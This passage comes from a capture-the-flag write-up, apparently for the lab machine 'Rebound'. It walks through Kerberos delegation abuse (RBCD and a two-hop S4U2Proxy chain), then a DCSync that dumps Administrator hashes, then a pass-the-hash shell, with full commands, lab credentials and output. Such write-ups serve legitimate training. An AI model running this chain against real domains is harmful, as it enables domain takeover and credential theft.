[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*delegator$*$b814bc56f4b6624ed9577dba$746ca579febb3db3787849648720d61e29dde7179d9edae5180509213279c38dffea8c5854340e84e852025ab0228fe9451518a634673f92dbfaa2cd3e742d27dc55667924898d9a080641c261391a77ad69f08802c893948625bd3ec2c288c3fc332dbbd6f4a2c165322a96d7380d2eb84022408916e7c0818f228a4c81025d2f5300654b254047e3e327f6e98a72dbbeaec947b1918f04079c578931774304f06b77cc644c57f026672f97cf32b8757cc5ed06decbafa5a1e1d077814bc571f58492f213935da45f8c17b094cd5006dbf232da82b9d15b8c952e5bc11e53c86c156a1ca653bd9007b5cbf7c1c07a08acbd03100d2ac689997df9882cc2a138a5992ff474b7e488c57dbcf1f263b6c6eb770132eb52478b5e7693f36e921b0ea6a885a6435f5b3846c6c1efbbce8b03fbd57abfc05343e51506a486cdf9bde945a42e5378a383994fc5fd046fd039c681496f1f8063d700927df541a5838285a87c50725fffa4b85728bd21e24032f1bac348fc9c0e0ff06b35f6fb182fa3d2e395d74e9ce6c3e0d1e7af7481d896c0160291fc7c5b64fca69dc6cff7426464d7ff7da77966736bb621a5879286280f0cf8ac6096a595a73145f95eb32a0b3526e710cab896a9281787ec7f1c0263dbdaa17612591086b04b2acc492f78a88738bda2a28867a8e2a30daadf53a1944cfefc1bd0eaad080bb54053aaed39b9afa482fb9c5bba727e2b6aa2ac137e044d78295db288099dfe30e049ab3709efa906c82d1c41f0bc45570cc1bc0fae496c017d74604ef94b6353285ded9890edb43a82f44c88df8e0114ffe491c5b2cb49ba9b9c475301b1d5141183ab8daf959e691bd19629d8f396c2dd61243c4792d96f37a14a5ff4d42bb66d7f3087e3c9bb85128e8b497f8015040f1412d3b49a170b34861dae74b104361d550b6c128dba37b10fb0f3d14a2ff34adb63e972c9e45642c81dbaafa2bdfcd15c85e478309d4beefddcea6546913fac23a231353e7eaeff2f26034879908eab5f55cdcb84edd88bc1e6f7ce556ab749a4e631dc4587446e988abffc4f40f890a9659fe6f31ca26f7c37a419bc077d22b325c87aace21ca87b7c456c1d461d34880b0e8771cb050a042d608043b55278180a749a627d5b6fac15ab13d1decc027905673869df5a593680099b1189530d143d0e66d3a850d8d4c4251493cfc6edfdf3059b96f6112f9851d4529007fb083de7febb0c9500254d1b5cc5a251b130a054c5cb6bc7c0eaef5bc639b59e775ad9e2d7c2e2e121aa5401d3843e93bb6ea2ecaf7c834da37659d4de3d5fcdba0d10dbc6173672a58387ee8ed8ced530dfcbc14a663d87682c4382bc1ff076ecc1ad16e44982c5a09c7cf50cbc10d17a1a0bcc4b9ba0caa26c35bd0b8eacab2f4e5ce4dc022799c2c5bf4fcef30185723d524097b2179040a98d0f3369c4bee5f783121db18f30141d494e0fa3e6e67860a17906b040de60df39936349d2248fcea853cf8e1733b57f5d6f962a6e788644aaa29890a74e70bf6f4f4eee574007
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : delegator$
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

### Setting Up RBCD

**Technical Concept**: We can modify `delegator$` to allow RBCD from `ldap_monitor`, then use a two-hop delegation chain.

Setting RBCD:

```
rbcd.py 'rebound.htb/delegator$' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb -action write -delegate-to 'delegator$' -delegate-from ldap_monitor -use-ldaps -k
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

**What this does**:

- Adds `ldap_monitor` to `msDS-AllowedToActOnBehalfOfOtherIdentity` on `delegator$`
- Now `ldap_monitor` can delegate to `delegator$`

### Two-Hop Delegation

**Step 1**: Get a ticket as `ldap_monitor` impersonating `DC01$` to a fake SPN:

```
impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$'                                                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache

export KRB5CCNAME=DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

**Why this works**: RBCD allows `ldap_monitor` to delegate to `delegator$`. The SPN doesn't matter for this first step.

**Step 2**: Use that ticket to get the final service ticket:

```
impacket-getST 'rebound.htb/delegator$' -spn 'http/dc01.rebound.htb' -impersonate 'DC01$' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

**Technical Explanation**:

- First ticket provides a forwardable TGT for `DC01$`
- Second ticket uses constrained delegation to request `http/dc01.rebound.htb`
- We now have a service ticket as `DC01$` to the HTTP service

## DCSync Attack

### Technical Concept: DCSync

**What is DCSync?**

- Attack that simulates domain controller replication
- Requests domain password data via Directory Replication Service (DRS) protocol
- Requires **Replicating Directory Changes** rights
- Domain Admins, Enterprise Admins, and some others have these rights by default

**Why it works**: Domain controllers trust other domain controllers to replicate data. If we can authenticate as a domain controller (DC01$), we can request replication.

### Executing DCSync

Export the final ticket:

```
export KRB5CCNAME=DC01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

Dump Administrator hash:

```
impacket-secretsdump -k -no-pass DC01.rebound.htb -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up... 
```

### Final Access

```
evil-winrm-py -i rebound.htb -u Administrator -H 176be138594933bb67db3b2572fc91b8
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'rebound.htb:5985' as 'Administrator'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\Administrator\Documents>
```

**Root flag**: `C:\Users\Administrator\Desktop\root.txt`

